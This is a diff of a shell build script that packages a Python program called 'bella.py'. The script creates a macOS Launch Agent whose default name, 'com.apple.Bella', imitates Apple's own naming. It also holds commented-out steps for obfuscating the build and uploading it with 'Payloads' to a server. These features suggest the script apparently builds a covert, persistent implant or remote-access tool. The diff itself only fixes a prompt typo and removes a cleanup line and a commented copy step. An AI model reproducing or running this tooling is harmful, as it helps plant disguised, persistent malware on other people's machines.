@@ -9,9 +9,8 @@ BuildsPath=Builds/$(date '+%m-%d@%H_%M')
 mkdir -p $BuildsPath
 development=false
 cp $bella $BuildsPath/bella.py
-#cp Payloads/INSTALLER $BuildsPath/INSTALLER
 
-read -p "What should the Launch Agent named? Default is [com.apple.Bella]: " launchagent
+read -p "What should the Launch Agent be named? Default is [com.apple.Bella]: " launchagent
 if [[ -z "$launchagent" ]]; then
 	launchagent='com.apple.Bella'
 fi
@@ -63,7 +62,6 @@ echo -e '\033[92mPreparing Python code.\033[0m'
 mv $BuildsPath/bella.py $BuildsPath/$bellaNoExt
 echo -e '\033[94mDone!\033[0m'
 
-
 #### The below is for automation of uploading to a server, and /or obfuscation. uncomment if you like.#####
 #compiled. now upload bella and payloads.
 #payloads_path=Payloads/payloads.txt
@@ -96,4 +94,3 @@ echo -e '\033[94mDone!\033[0m'
 #echo -e '\n\033[91m\033[1mUploaded Build!\033[0m'
 
 echo -e '\033[91mBuilt Bella is in' $BuildsPath '\033[0m'
-rm $BuildsPath/$bellaNoExt.c $BuildsPath/bella.py* 2>/dev/null
